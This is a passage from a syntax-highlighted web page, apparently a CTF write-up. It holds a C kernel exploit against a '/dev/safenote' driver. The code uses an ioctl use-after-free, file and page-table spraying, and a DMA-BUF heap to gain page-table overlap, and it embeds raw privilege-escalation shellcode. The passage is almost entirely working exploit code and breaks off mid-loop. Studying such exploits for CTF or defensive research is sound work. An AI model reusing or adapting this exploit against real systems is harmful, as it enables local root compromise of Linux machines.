class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_PAGESPRAY 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_FILESPRAY 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_FD 0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_FD 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TMP_FD 0x50</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMA_HEAP_IOCTL_ALLOC 0xc0184800</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u32;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> &#123;</span></span><br><span class="line">  u64 len;</span><br><span class="line">  u32 fd;</span><br><span class="line">  u32 fd_flags;</span><br><span class="line">  u64 heap_flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1338</span>, &amp;index); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1339</span>, &amp;index); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, &amp;index); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/vda&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Lose...&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Win!&quot;</span>);</span><br><span class="line">        read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">        write(<span class="number">1</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="number">213</span>] = &#123;</span><br><span class="line">    <span class="number">0xF3</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0xFA</span>, <span class="number">0xE8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8D</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x49</span>, <span class="number">0x81</span>, <span class="number">0xEF</span>, <span class="number">0xF0</span>, <span class="number">0xB7</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0xBF</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0xA7</span>, <span class="number">0x02</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>,</span><br><span class="line">    <span class="number">0x87</span>, <span class="number">0x70</span>, <span class="number">0x26</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0xBF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xA0</span>,</span><br><span class="line">    <span class="number">0x8F</span>, <span class="number">0x1B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC7</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0xB7</span>, <span class="number">0xC0</span>, <span class="number">0x68</span>, <span class="number">0xA7</span>, <span class="number">0x02</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xD0</span>, <span class="number">0x0A</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0xBF</span>, <span class="number">0x20</span>, <span class="number">0x53</span>, <span class="number">0xBB</span>, <span class="number">0x02</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xF0</span>, <span class="number">0xC0</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>, <span class="number">0xBF</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xA0</span>, <span class="number">0x8F</span>, <span class="number">0x1B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x55</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x28</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x66</span>, <span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xC6</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x01</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0xCC</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *page_spray[N_PAGESPRAY];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> uaf_index = <span class="number">0xc0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    FILE *file;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *filename = <span class="string">&quot;/tmp/elf&quot;</span>;</span><br><span class="line"></span><br><span class="line">    file = fopen(filename, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/safenote&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dmafd = creat(<span class="string">&quot;/dev/dma_heap/system&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dmafd == <span class="number">-1</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;/dev/dma_heap/system&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Prepare pages for PTE&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">        page_spray[i] = mmap((<span class="type">void</span>*)(<span class="number">0xdead0000</span>UL + i*<span class="number">0x10000</span>UL),</span><br><span class="line">                            <span class="number">0x8000</span>, PROT_READ|PROT_WRITE,</span><br><span class="line">                            MAP_ANONYMOUS|MAP_SHARED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page_spray[i] == MAP_FAILED) err_exit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">        add(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tmp_fd[TMP_FD];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TMP_FD; i++)&#123;</span><br><span class="line">        tmp_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(tmp_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == uaf_index)&#123;</span><br><span class="line">            uaf(uaf_index);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        del(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;spray read file.&quot;</span>);</span><br><span class="line">    <span class="type">int</span> read_fd[READ_FD];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">        read_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(read_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del(uaf_index);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;spray write file.&quot;</span>);</span><br><span class="line">    <span class="type">int</span> write_fd[WRITE_FD];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">        write_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_WRONLY);</span><br><span class="line">        <span class="keyword">if</span>(write_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;find the uaf read file&quot;</span>);</span><br><span class="line">    <span class="type">int</span> uaf_read_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">        <span class="type">int</span> ret = write(read_fd[i], buf, <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find the uaf read fd %d \n&quot;</span>, i);</span><br><span class="line">            uaf_read_fd = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uaf_read_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;can not find the uaf read fd.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;close the file.&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TMP_FD; i++)&#123;</span><br><span class="line">        close(tmp_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == uaf_read_fd)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(read_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">        close(write_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Allocating PTEs...&quot;</span>);</span><br><span class="line">    info(<span class="string">&quot;Allocate many PTEs (1)&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY/<span class="number">2</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">            *(<span class="type">char</span>*)(page_spray[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Allocate DMA-BUF heap&quot;</span>);</span><br><span class="line">    <span class="type">int</span> dma_buf_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line">    data.len = <span class="number">0x1000</span>;</span><br><span class="line">    data.fd_flags = O_RDWR;</span><br><span class="line">    data.heap_flags = <span class="number">0</span>;</span><br><span class="line">    data.fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] dma_buf_fd: %d\n&quot;</span>, dma_buf_fd = data.fd);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Allocate many PTEs (2)&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = N_PAGESPRAY/<span class="number">2</span>; i &lt; N_PAGESPRAY; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">            *(<span class="type">char</span>*)(page_spray[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (dup(read_fd[uaf_read_fd]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Searching for overlapping page...&quot;</span>);</span><br><span class="line">    <span class="comment">// Search for page that overlaps with other physical page</span></span><br><span class="line">    <span class="type">void</span> *evil = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">        <span class="comment">// We wrote &#x27;H&#x27;(=&#x27;A&#x27;+7) but if it changes the PTE overlaps with the file</span></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">char</span>*)(page_spray[i] + <span class="number">7</span>*<span class="number">0x1000</span>) != <span class="string">&#x27;A&#x27;</span> + <span class="number">7</span>) &#123; <span class="comment">// +38h: f_count</span></span><br><span class="line">        evil = page_spray[i] + <span class="number">0x7000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Found overlapping page: %p\n&quot;</span>, evil);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        